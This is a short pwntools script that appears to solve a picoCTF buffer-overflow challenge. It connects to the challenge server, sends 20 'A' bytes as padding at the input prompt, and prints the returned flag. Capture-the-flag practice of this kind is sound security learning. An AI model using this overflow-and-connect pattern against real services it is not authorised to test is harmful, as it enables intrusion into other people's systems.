#!/usr/bin/env python3

from pwn import *

exp = b"A"*20

con = remote("saturn.picoctf.net",65355)

con.recvuntil(b"Input:")
con.sendline(exp)
flag = con.recvline()
print(flag.decode("utf-8"))
con.close()